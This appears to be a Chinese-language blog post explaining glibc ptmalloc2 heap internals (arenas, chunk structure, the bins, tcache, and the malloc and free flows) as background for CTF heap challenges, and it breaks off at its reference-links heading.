    <content type="html"><![CDATA[<h2 id="堆基础知识"><a href="#堆基础知识" class="headerlink" title="堆基础知识"></a>堆基础知识</h2><h3 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h3><p>堆（Heap）是虚拟地址空间的一块连续的线性区域，提供动态分配的内存，允许程序申请大小未知的内存，它在用户与操作系统之间，作为动态内存管理的中间人。同时堆响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序，管理用户所释放的内存，并在合适的时候还给操作系统。</p><p>简单来说，堆主要是指用户动态申请的内存（如调用malloc、alloc、alloca、new等函数）。</p><p>目前有以下几种内存分配器：</p><ul><li><p>Dlmalloc-General purpose allocator</p></li><li><p><strong>ptmalloc2-glibc</strong> (重点)</p></li><li><p>Jemalloc-Firefox</p></li><li><p>Tcmalloc-chrome</p></li><li><p>…</p></li></ul><p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的ptmalloc2代替了。</p><p>CTF比赛中有关堆的PWN题大多是基于Linux的ptmalloc2-glibc堆块管理机制的。因此，在整个系列实验中，我们只会研究glibc malloc内存管理器。</p><p><img src="https://s2.loli.net/2021/12/26/g3yWXfUqkpemKxS.png"></p><p>堆管理器并非由操作系统实现，而是由libc.so.6链接库实现。封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效地管理由系统调用申请来的内存，申请内存的系统调用有brk和mmap两种。</p><ol><li><p>brk是将数据段(.data)的最高地址指针_edata往高地址推。（_edata指向数据段的最高地址）</p></li><li><p>mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。</p></li></ol><p>这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。malloc小于128k的内存时，glibc使用brk分配内存；大于128k时，使用mmap分配内存，在堆和栈之间找一块空闲内存分配。第一次执行malloc可能出现的系统调用如下。</p><p><img src="https://s2.loli.net/2021/12/26/2kMLT3zoeWIiKhu.png"></p><h3 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h3><p>​    一个线程申请的1个或多个堆包含很多的信息：二进制位信息，多个malloc_chunk信息等这些堆需要东西来进行管理，那么Arena就是来管理线程中的这些堆的，也可以理解为堆管理器所持有的内存池。</p><p>操作系统–&gt;堆管理器–&gt;用户</p><p>物理内存–&gt; arena -&gt; 可用内存</p><p>堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发来的有冗余的内存库存。</p><p>一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的</p><p>主线程的arnea称为“main_arena”。子线程的arnea称为“thread_arena”。</p><p>主线程无论一开始malloc多少空间，只要size&lt;128KB，kernel都会给132KB的heap segment(rw)。这部分称为main arena。 main_arena 并不在申请的 heap 中，而是一个全局变量，在 libc.so 的数据段。</p><p><img src="https://s2.loli.net/2021/12/26/PZBcvl3kx4LG5ge.png"></p><p><img src="https://s2.loli.net/2021/12/26/8AcfYMhiksoJFQ3.png">后续的申请的内存会一直从这个arena中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加堆的空间。类似地，arena也可以通过减小brk来缩小自己的空间。</p><p>即使将所有main arena所分配出去的内存块free完，也不会立即还给kernel，而是交由glibc来管理。当后面程序再次申请内存时，在glibc中管理的内存充足的情况下，glibc就会根据堆分配的算法来给程序分配相应的内存。</p><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>​    glibc malloc源码中有三种最基本的堆块数据结构，分别为heap_info、malloc_state、malloc_chunk，为了使问题简单化，这里着重介绍单线程的malloc_chunk。</p><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。</p><p>​    malloc_chunk 的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  <br>INTERNAL_SIZE_T   prev_size; <span class="hljs-comment">/* Size of previous chunk (if free). */</span><br>INTERNAL_SIZE_T   size;    <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>     <span class="hljs-comment">/* double links -- used only if free. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p> 一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><p> 每个字段的具体的解释如下：</p><p><strong>prev_size</strong>, 如果该 chunk 的物理相邻的前一地址 chunk是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。</p><p><strong>size</strong>，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。</p><p>其中，32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示。</p><p>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p><p>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p><p><img src="https://s2.loli.net/2021/12/26/aN7cAyHVRs31CwW.png"></p><p>Chunk总结构示意图</p><p><strong>fd</strong>，<strong>bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下：</p><p>fd 指向下一个（非物理相邻）空闲的 chunk。</p><p>bk 指向上一个（非物理相邻）空闲的 chunk。</p><p>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理。</p><p><strong>fd_nextsize</strong>， <strong>bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p><p>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p><h3 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h3><p>chunk是用户申请内存的单位，也是堆管理器管理内存的基本单位。malloc()返回的指针指向一个chunk的数据区域。</p><p><img src="https://s2.loli.net/2021/12/26/Mp5cDkUZfrRCmBl.png"></p><p>chunk最小为（size_t * 4），size_t = unsigned long int。Chunk由两部分组成，头部header（pre_size+size）和数据部分user data。如果该chunk被free，就会将chunk加入到名为bin的linked list。</p><p>按使用状态通常可分为allocated chunk、free chunk、 top chunk 和last remainder chunk四种。按大小可分为fast、small、large和tcache chunk。</p><h4 id="Allocated-chunk"><a href="#Allocated-chunk" class="headerlink" title="Allocated chunk"></a>Allocated chunk</h4><p>Allocated chunk，如果上一块的chunk是free的状态，则pre_size为连续内存块的上一块chunk的大小，否则用于存储前一个chunk的数据。Size位记录着当前chunk的大小（包括header），其中有三个flag。下图为malloced chunk。</p><p>N flag，NON_MAIN_ARENA，记录当前 chunk是否不属于主线程，1 表示不属于，0 表示属于。</p><p>M flag，IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p><p>P flag，PREV_INUSE，记录前一个 chunk 块是否被分配。</p><p><img src="https://s2.loli.net/2021/12/26/AVl6TaSKsH7onkI.png"></p><h4 id="Freed-chunk"><a href="#Freed-chunk" class="headerlink" title="Freed chunk"></a>Freed chunk</h4><p>Freed chunk，如果chunk被free，glibc则会将该chunk加入名为bin的linked list中。下面为freed chunk的图示。其中，fd：point to next chunk（包含bin），bk：point to last chunk（包含bin），这里指的是linked list中的（next/last chunk），而非连续内存块的chunk。fd_nextsize：point to next large chunk，bk_nextsize：point to last large chunk（不包含bin的头指针）。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p><p><img src="https://s2.loli.net/2021/12/26/5L8TtfK6RrW3Hju.png"></p><h4 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h4><p>Top chunk，在第一次malloc的时候，glibc就会将堆切成两块chunk，第一块chunk就是分配出去的chunk，剩下的空间视为top chunk，之后要是分配空间不足时将会由top chunk分配出去，它的size为表示top chunk还剩多少空间。假设 Top chunk 当前大小为 N 字节，用户申请了 K 字节的内存，那么 Top chunk 将被切割为：</p><ul><li><p>一个 K 字节的 chunk，分配给用户</p></li><li><p>一个 N-K 字节的 chunk，称为 Last Remainder chunk</p></li></ul><p>后者成为新的 Top chunk。如果连 Top chunk 都不够用了，那么：</p><ul><li><p>在 main_arena 中，用 brk() 扩张 Top chunk</p></li><li><p>在 non_main_arena 中，用 mmap() 分配新的堆</p></li></ul><blockquote><p>注：top chunk的prev_inuse位总是1，否则其前面的 chunk 就会被合并到 top chunk 中。</p></blockquote><h3 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h3><p>Bins为一个单向或者双向链表，存放着空闲的chunk（freed chunk）。glibc为了让malloc可以更快找到合适大小的chunk，因此在free掉一个chunk时，会把该chunk根据大小加入合适的bin中。</p><p>Bins一共可分为fast bin、small bin、large bin、unsorted bin和tcache bin。可分为：10个fast bins，存储在fastbinsY中；1个unsorted bin，存储在bins[1]；62个small bins，存储在bins[2]至bins[63]；63个large bins，存储在bins[64]至bins[126]。其中虽然定义了NBINS=128，但是bins[0]和bins[127]其实是不存在的。</p><ol><li><p>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</p></li><li><p>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。</p></li><li><p>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</p></li></ol><p>​    整个数组大概如下图所示。</p><p><img src="https://s2.loli.net/2021/12/26/BsqzWHRhDnC3PNV.png"></p><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p>Fast bins非常像高速缓存cache，主要用于提高小内存分配效率。相邻空闲chunk不会被合并，这会导致内存碎片增多但是free效率提升。注意：fast bins时10个LIFO的单链表，最后三个链表保留未使用。</p><p>默认情况下，对于 SIZE_SZ 为 4B 的平台， 小于 64B 的 chunk 分配请求，对于 SIZE_SZ 为 8B 的平台，小于 128B 的 chunk 分配请求，首先会查找fast bins中是否有所需大小的chunk存在（精确匹配），如果存在，就直接返回。</p><p>Fast bin的chunk 大小（含 chunk 头部）：0x10-0x40（64 位 0x20-0x80）B，相邻 bin 存放的大小相差 0x8（0x10）B。总结以下特点。</p><ul><li><p>fastbinsY[]，fast bin存放在此数组中 </p></li><li><p>单向链表 </p></li><li><p>LIFO（last in first out，当下次malloc大小与这次free大小相同时，会从相同的bin取出，也就是会取到相同位置的chunk） </p></li><li><p>管理 16、24、32、40、48、56、64 Bytes 的 free chunks（32位下默认） </p></li><li><p>其中的chunk的in_use位（下一个物理相邻的chunk的P位）总为1。也就是说，释放到fastbin的chunk不会被清除in_use标志位。</p></li></ul><p>关于fastbin最大大小参见宏DEFAULT_MXFAST:</p><p><img src="https://s2.loli.net/2021/12/26/BAmqKQPbcCIzXf7.png"></p><p>在初始化时，这个值会被复制给全局变量global_max_fast。申请fast chunk时遵循first fit原则。释放一个fast chunk时，首先检查它的大小以及对应fastbin此时的第一个chunk的大小是否合法，随后它会被插入到对应fastbin的链表头，此时其fd指向上一个被free的chunk。</p><p>Fast bin示意图如下。</p><p><img src="https://s2.loli.net/2021/12/26/MSJdCzYVIQehOlP.png"></p><h4 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h4><p>Unsorted bin非常像缓冲区buffer，大小超过fast bins阈值的chunk被释放时会加入到这里，这使得ptmalloc2可以复用最近释放的chunk，从而提升效率。</p><p>所有的大小超过fast bins阈值的 chunk 在回收时都要先放到 unsorted bin中，分配时，如果在 unsorted bin 中没有合适的 chunk，就会把 unsorted bin 中的所有 chunk分别加入到所属的 bin 中，然后再在 bin 中分配合适的 chunk。Bins 数组中的元素 bin[1]用于存储 unsorted bin 的 chunk 链表头。</p><p>它是一个双向循环链表，chunk大小大于global_max_fast。</p><p>当程序申请大于global_max_fast内存时，glibc会遍历unsorted bin，每次取最后的一个unsorted bin。</p><ol><li><p>如果 unsorted chunk 满足以下四个条件，它就会被切割为一块满足申请大小的 chunk 和另一块剩下的 chunk，前者返回给程序，后者重新回到 unsorted bin。</p><ul><li><p>申请大小属于 small bin 范围</p></li><li><p>unosrted bin 中只有该 chunk</p></li><li><p>这个 chunk 同样也是 last remainder chunk</p></li><li><p>切割之后的大小依然可以作为一个 chunk</p></li></ul></li><li><p>否则，从 unsorted bin 中删除 unsorted chunk。</p><ul><li><p>若 unsorted chunk 恰好和申请大小相同，则直接返回这个 chunk</p></li><li><p>若 unsorted chunk 属于 small bin 范围，插入到相应 small bin</p></li><li><p>若 unsorted chunk 属于 large bin 范围，则跳转到 3。</p></li></ul></li><li><p>此时 unsorted chunk 属于 large bin 范围。</p><ul><li><p>若对应 large bin 为空，直接插入 unsorted chunk，其 fd_nextsize 与 bk_nextsize 指向自身。</p></li><li><p>否则，跳转到 4。</p></li></ul></li><li><p>到这一步，我们需按大小降序插入对应 large bin。</p><ul><li><p>若对应 large bin 最后一个 chunk 大于 unsorted chunk，则插入到最后</p></li><li><p>否则，从对应 large bin 第一个 chunk 开始，沿 fd_nextsize（即变小）方向遍历，直到找到一个 chunk 命名为c，其大小小于等于 unsorted chunk 的大小</p></li><li><p>若c大小等于unsorted chunk大小，则插入到c后面</p></li><li><p>否则，插入到c前面</p></li></ul></li></ol><p>直到找到满足要求的unsorted chunk，或无法找到，去top chunk切割为止。总结以下特点。</p><ul><li><p>双向循环链表</p></li><li><p>当free的chunk大小大于等于144字节时，为了效率，glibc并不会马上将chunk放到相对应的bin中，而会先放到unsorted bin</p></li><li><p>而下次mallocs时将会先找找看unsorted bin中是否有合适的chunk，找不到才会去对应的bin中寻找，此时会顺便把unsorted bin的chunk放到对应的bin中，但small bin除外，为了效率，反⽽而先从small bin找</p></li></ul><p>Unsorted bin的示意图如下。</p><p><img src="https://s2.loli.net/2021/12/26/fN7YkUyHADWL3cB.png"></p><h4 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h4><p>Small bins，chunk size小于0x200（64位下0x400）字节的chunk叫做small chunk，而small bins存放的就是这些small chunk。Chunk大小同样是从16字节开始每次+8字节。</p><p>small bins 是 62 个双向循环链表，并且是 FIFO 的，这点和 fast bins 相反。同样相反的是相邻的空闲 chunk 会被合并。chunk大小：0x10-0x1f0字节（64位下0x20-0x3f0），相邻bin存放的大小相差0x8（0x10）字节。</p><p>ptmalloc 维护了 62 个双向环形链表（每个链表都具有链表头节点，加头节点的最大作用就是便于对链表内节点的统一处理，即简化编程），每一个链表内的各空闲 chunk 的大小一致，因此当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了，这样既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。</p><p>释放非 fast chunk 时，按以下步骤执行：</p><ol><li><p>若前一个相邻chunk空闲，则合并，触发对前一个相邻 chunk的unlink操作</p></li><li><p>若下一个相邻chunk是top chunk，则合并并结束；否则继续执行 3</p></li><li><p>若下一个相邻 chunk 空闲，则合并，触发对下一个相邻chunk的unlink 操作；否则，设置下一个相邻 chunk 的 PREV_INUSE 为 0</p></li><li><p>将现在的chunk插入unsorted bin。</p></li><li><p>若size超过了FASTBIN_CONSOLIDATION_THRESHOLD，则尽可能地合并 fastbin中的chunk，放入unsorted bin。若top chunk大小超过了 mp_.trim_threshold，则归还部分内存给 OS。</p></li></ol><p><img src="https://s2.loli.net/2021/12/26/wp7kTC25DB4dn6X.png"></p><p>​    总结有以下特点。</p><ul><li><p>双向循环链表</p></li><li><p>Chunk size &lt; 0x400 byte（64位）</p></li><li><p>FIFO</p></li><li><p>根据大小再分成62个大小不同的bin</p><ul><li>0x20,0x30…0x60,0x70…</li></ul></li></ul><p>Small bins图示如下。</p><p><img src="https://s2.loli.net/2021/12/26/bgGS7P1uXILi6Fk.png"></p><h4 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h4><p>Large bins存放的是大于等于0x200（64位下0x400）字节的chunk，它是63个双向循环链表，插入和删除可以发生在任意位置，相邻空闲chunk也会被合并。Chunk大小就比较复杂了：</p><ul><li><p>前32个bins：从0x400字节开始每次+0x40字节</p></li><li><p>接下来的16个bins：每次+0x200字节</p></li><li><p>接下来的8个bins：每次+0x1000字节</p></li><li><p>接下来的4个bins：每次+0x8000字节</p></li><li><p>接下来的2个bins：每次+0x40000字节</p></li><li><p>最后的1个bin：只有一个chunk，大小和large bins剩余的大小相同</p></li></ul><p>同一个bin中的chunks不是相同大小的，按大小降序排列。这和上面的几种 bins都不一样。而在取出chunk时，也遵循best fit原则，取出满足大小的最小 chunk。总结以下特点。</p><ul><li><p>双向循环链表（排好序了）</p></li><li><p>Chunk size &gt; 0x400</p></li><li><p>Freed chunk多两个指针fd_nextsize、bk_nextsize指向前一块和后一块large chunk</p></li><li><p>根据大小再分成63个bin但大小不再是固定大小增加</p><ul><li><p>前32个bin为0x400+0x40*i</p></li><li><p>32~48bin为0x1380+0x200*i</p></li><li><p>…以此类推</p></li></ul></li><li><p>不再是每个bin中的chunk大小都固定，每个bin中存着该范围内不同大小的bin并在过程中进行排序用来加快寻找的速度，大的chunk会放在前面，小的chunk会放在后面</p></li><li><p>FIFO</p></li></ul><p>Large bins示意图如下。</p><p><img src="https://s2.loli.net/2021/12/26/SHNq5R14s6LzdjG.png"></p><h4 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h4><p>Tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有7个chunk，free的时候当tcache满了才放入fastbin或unsorted bin，malloc的时候优先去tcache找。</p><p>基本工作方式：</p><ul><li><p>malloc 时，会先 malloc 一块内存用来存放 tcache_perthread_struct 。</p></li><li><p>free 内存，且 size 小于 small bin size 时</p><ul><li><p>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</p></li><li><p>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</p></li><li><p>tcache 中的 chunk 不会合并（不取消 inuse bit）</p></li></ul></li><li><p>malloc 内存，且 size 在 tcache 范围内</p><ul><li>先从 tcache 取 chunk，直到 tcache 为空</li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来。</li></ul></li></ul><h3 id="堆分配策略"><a href="#堆分配策略" class="headerlink" title="堆分配策略"></a>堆分配策略</h3><p>在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。malloc小于128k的内存时，glibc使用brk分配内存；大于128k时，使用mmap分配内存，在堆和栈之间找一块空闲内存分配。第一次执行malloc可能出现的系统调用如下。</p><p><img src="https://s2.loli.net/2021/12/26/2kMLT3zoeWIiKhu.png"></p><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>malloc的规则可以对照malloc的源码中的_int_malloc函数来查看，这里主要介绍最基本的情况。最开始glibc所管理的内存空间是用brk系统调用产生的内存空间，如果malloc申请的空间太大，超过了现有的空闲内存，则会调用brk或mmap继续产生内存空间。</p><p>malloc根据用户申请的内存块大小以及相应大小chunk通常使用的频度（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。它由小到大依次检查不同的bin中是否有相应的空闲块可以满足用户请求的内存。当所有的空闲chunk都无法满足时，它会考虑top chunk。当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</p><p>​    对于malloc申请一般大小（不超过现有空闲内存大小）的内存，其简化版流程如下。</p><p><img src="https://s2.loli.net/2021/12/26/hCj4aQvWRJt9GVO.png"></p><p>​     首先将size按照一定规则对齐，得到最终要分配的大小size_real，具体如下。</p><ul><li><p>.x86：size+4按照0x10字节对齐。</p></li><li><p>.x64：size+8按照0x20字节对齐。</p></li></ul><ol><li><p>检查size_real是否符合fast bin的大小，若是则查看fast bin中对应size_real的那条链表中是否存在堆块，若是则分配返回，否则进入第2步。</p></li><li><p>检查size_real是否符合small bin的大小，若是则查看small bin中对应size_real的那条链表中是否存在堆块，若是则分配返回，否则进入第3步。</p></li><li><p>检查size_real是否符合large bin的大小，若是则调用malloc_consolidate函数对fast bin中所有的堆块进行合并，其过程为将fast bin中的堆块取出，清除下一块的p标志位并进行堆块合并，将最终的堆块放入unsorted bin。然后在small bin和large bin中找到适合size_real大小的块。若找到则分配，并将多余的部分放入unsorted bin，否则进入第4步。</p></li><li><p>检查top chunk的大小是否符合size_real的大小，若是则分配前面一部分，并重新设置top chunk，否则调用malloc_consolidate函数对fast bin中的所有堆块进行合并，若依然不够，则借助系统调用来开辟新空间进行分配，若还是无法满足，则在最后返回失败。</p></li></ol><p>这里面值得注意的点如下。</p><ol><li><p>fast bin的分配规则是LIFO。</p></li><li><p>malloc_consolidate函数调用的时机：它在合并时会检查前后的块是否已经释放，并触发unlink。</p></li></ol><p>在 glibc 的 malloc.c 中，malloc 的说明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  malloc(size_t n)</span><br><span class="hljs-comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="hljs-comment">  if no space is available. Additionally, on failure, errno is</span><br><span class="hljs-comment">  set to ENOMEM on ANSI C systems.</span><br><span class="hljs-comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="hljs-comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="hljs-comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="hljs-comment">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="hljs-comment">  of space, which will often fail. The maximum supported value of n</span><br><span class="hljs-comment">  differs across systems, but is in all cases less than the maximum</span><br><span class="hljs-comment">  representable value of a size_t.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理：</p><ul><li><p>当 n=0 时，返回当前系统允许的堆的最小内存块。</p></li><li><p>当 n 为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</p></li></ul><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>free函数将用户暂且不用的chunk回收给堆管理器，适当的时候还会归还给操作系统。它依据chunk大小来优先试图将free chunk链入tcache或者是fast bin。不满足则链入usorted bin中。在条件满足时free函数遍历usorted bin并将其中的物理相邻的free chunk合并，将相应大小的chunk分类放入small bin或large bin中。除了tcache chunk与fast bin chunk，其它chunk在free时会与其物理相邻的free chunk合并。</p><p>一个简易的内存释放流程如下。</p><p><img src="https://s2.loli.net/2021/12/26/HiO1JorCGTtbBIc.png"></p><p>相关宏如下。</p><p><img src="https://s2.loli.net/2021/12/26/hItu3vUofBLqjdD.png"></p><p>​     堆块在释放时会有一系列的检查，可以与源码进行对照。在这里，将对一些关键的地方进行说明。</p><ol><li><p>释放（free）时首先会检查地址是否对齐，并根据size找到下一块的位置，检查其p标志位是否置为1。</p></li><li><p>检查释放块的size是否符合fast bin的大小区间，若是则直接放入fast bin，并保持下一堆块中的p标志位为1不变（这样可以避免在前后块释放时进行堆块合并，以方便快速分配小内存），否则进入第3步。</p></li><li><p>若本堆块size域中的p标志位为0（前一堆块处于释放状态），则利用本块的pre_size找到前一堆块的开头，将其从bin链表中摘除（unlink），并合并这两个块，得到新的释放块。</p></li><li><p>根据size找到下一堆块，如果是top chunk，则直接合并到top chunk中去，直接返回。否则检查后一堆块是否处于释放状态（通过检查下一堆块的下一堆块的p标志位是否为0）。将其从bin链表中摘除（unlink），并合并这两块，得到新的释放块。</p></li><li><p>将上述合并得到的最终堆块放入unsorted bin中去。</p></li></ol><p> 这里有以下几个值得注意的点：</p><ol><li><p>合并时无论向前向后都只合并相邻的堆块，不再往更前或者更后继续合并。</p></li><li><p>释放检查时，p标志位很重要，大小属于fast bin的堆块在释放时不进行合并，会直接被放进fast bin中。在malloc_consolidate时会清除fast bin中所对应的堆块下一块的p标志位，方便对其进行合并。</p></li></ol><p>在 glibc 的 malloc.c 中，free 的说明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">      free(void* p)</span><br><span class="hljs-comment">      Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="hljs-comment">      allocated using malloc or a related routine such as realloc.</span><br><span class="hljs-comment">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="hljs-comment">      effects if p has already been freed.</span><br><span class="hljs-comment">      Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="hljs-comment">      when possible, automatically trigger operations that give</span><br><span class="hljs-comment">      back unused memory to the system, thus reducing program footprint.</span><br><span class="hljs-comment">    */</span><br></code></pre></td></tr></table></figure><p>可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><p>此外，该函数也同样对异常情况进行了处理：</p><ul><li><p>当 p 为空指针时，函数不执行任何操作。</p></li><li><p>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。</p></li><li><p>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</p></li></ul><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p><p>​    初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同。</p><p>l 不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</p><p>l 开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</p><p>具体效果如下图。</p><p><img src="https://s2.loli.net/2021/12/26/erBaMzKku1iNfoW.png"></p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>​    malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><p>​    在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p><h2 id="参考链接"><a href="#参考链接" 